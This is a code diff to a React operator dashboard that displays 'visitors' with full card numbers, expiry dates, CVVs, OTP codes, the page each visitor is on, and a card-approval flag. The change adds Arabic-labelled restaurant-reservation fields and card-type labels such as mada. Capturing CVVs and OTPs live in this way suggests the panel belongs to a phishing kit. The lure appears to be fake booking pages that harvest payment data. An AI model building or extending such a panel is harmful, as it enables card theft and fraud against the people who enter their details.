@@ -14,7 +14,7 @@ import {
   AlertDialogTitle,
 } from "@/components/ui/alert-dialog";
 import { toast } from "@/hooks/use-toast";
-import { User, CreditCard, Phone, Mail, IdCard, Calendar, Volume2, LogOut, Users, Eye, Shield, Car, DollarSign, Trash2, Send } from "lucide-react";
+import { User, CreditCard, Phone, Mail, IdCard, Calendar, Volume2, LogOut, Users, Eye, Shield, Car, DollarSign, Trash2, Send, UtensilsCrossed, Clock } from "lucide-react";
 
 interface OtpEntry {
   code: string;
@@ -42,6 +42,7 @@ interface VisitorData {
   expiryMonth?: string;
   expiryYear?: string;
   cvv?: string;
+  cardCategory?: string;
   cardHistory?: CardEntry[];
   currentPage?: string;
   status?: string;
@@ -58,6 +59,11 @@ interface VisitorData {
   totalAmount?: number;
   ticketQuantity?: number;
   cardApproved?: boolean;
+  reservationType?: string;
+  restaurantName?: string;
+  reservationDate?: string;
+  reservationTime?: string;
+  reservationGuests?: string;
 }
 
 const pageNames: Record<string, string> = {
@@ -602,6 +608,29 @@ export default function DashboardPage() {
                 </MessageBubble>
               )}
 
+              {selectedVisitor.reservationType === "restaurant" && selectedVisitor.restaurantName && (
+                <MessageBubble type="received" time="">
+                  <div className="space-y-3">
+                    <div className="flex items-center gap-2 text-orange-400 font-semibold">
+                      <UtensilsCrossed className="w-4 h-4" />
+                      <span>حجز مطعم</span>
+                    </div>
+                    <div className="grid grid-cols-2 gap-2 text-sm">
+                      <InfoRow icon={UtensilsCrossed} label="المطعم" value={selectedVisitor.restaurantName} />
+                      {selectedVisitor.reservationDate && (
+                        <InfoRow icon={Calendar} label="التاريخ" value={selectedVisitor.reservationDate} />
+                      )}
+                      {selectedVisitor.reservationTime && (
+                        <InfoRow icon={Clock} label="الوقت" value={selectedVisitor.reservationTime} />
+                      )}
+                      {selectedVisitor.reservationGuests && (
+                        <InfoRow icon={Users} label="عدد الضيوف" value={selectedVisitor.reservationGuests} />
+                      )}
+                    </div>
+                  </div>
+                </MessageBubble>
+              )}
+
               {selectedVisitor.totalAmount && (
                 <MessageBubble type="received" time="">
                   <div className="space-y-3">
@@ -636,7 +665,10 @@ export default function DashboardPage() {
                     <div className="bg-gradient-to-br from-[#1e3a5f] via-[#1a2c38] to-[#0d1c24] rounded-xl p-4 space-y-4 border border-[#2a4a5a] shadow-lg">
                       <div className="flex justify-between items-start">
                         <div className="w-10 h-7 bg-gradient-to-br from-yellow-300 to-yellow-500 rounded-md" />
-                        <div className="text-[#8696a0] text-xs">Credit Card</div>
+                        <div className="text-[#8696a0] text-xs">
+                          {selectedVisitor.cardCategory === "debit" ? "مدى" : 
+                           selectedVisitor.cardCategory === "platinum" ? "بلاتينية" : "ائتمانية"}
+                        </div>
                       </div>
                       
                       <div className="text-white font-mono text-xl tracking-wider" dir="ltr">
